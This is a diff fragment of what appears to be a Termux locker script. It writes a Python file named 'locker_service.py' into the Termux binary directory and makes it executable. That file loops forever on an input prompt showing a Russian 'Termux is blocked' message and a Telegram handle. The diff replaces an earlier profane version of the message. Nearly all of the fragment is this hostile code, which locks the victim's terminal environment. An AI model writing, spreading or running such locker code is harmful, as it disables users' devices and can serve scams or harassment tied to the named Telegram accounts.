@@ -11,7 +11,7 @@ file.write("""print('''  _____
 
 ''')
 while True:
-	a = input(' Термуксу пиздец, поздравляю! @Enter_TermuxGuide (Telegram)')
+	a = input(' Termux заблокирован. @TermuxGulde (Telegram)')
 """)
 file.close()
 os.system('chmod +x /data/data/com.termux/files/usr/bin/locker_service.py')
